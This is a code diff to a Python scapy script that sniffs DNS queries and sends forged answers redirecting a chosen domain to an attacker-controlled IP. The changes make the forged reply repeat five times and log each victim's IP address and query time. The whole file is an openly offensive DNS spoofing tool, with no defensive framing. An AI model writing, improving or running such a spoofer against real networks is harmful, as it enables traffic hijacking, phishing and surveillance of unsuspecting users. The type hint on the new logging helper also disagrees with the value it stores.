@@ -1,4 +1,7 @@
-from scapy.all import *#type:ignore
+from scapy.all import * #type:ignore
+from data.data_helper import record_entry
+
+import time
 
 # Configuration
 SPOOF_DOMAIN = "www.techinginfo.com"  # Domain to spoof
@@ -28,8 +31,15 @@ def dns_spoof(pkt):
             )
 
             # Send spoofed response
-            send(spoofed_pkt, verbose=0)
+            for _ in range(5):
+                sendp(spoofed_pkt, verbose=0)
+                time.sleep(0.1)
             print(f"Spoofed DNS response sent: {qname} -> {SPOOF_IP}")
+            record_entry(SPOOF_DOMAIN,build_dict_from_packet(pkt))
+            
+def build_dict_from_packet(pkt) -> dict[str,str]:
+    return {"IP":pkt[IP].src,"Time":time.time()}
+
 
 # Sniff DNS packets
 print(f"Sniffing DNS queries for {SPOOF_DOMAIN} on {INTERFACE}...")
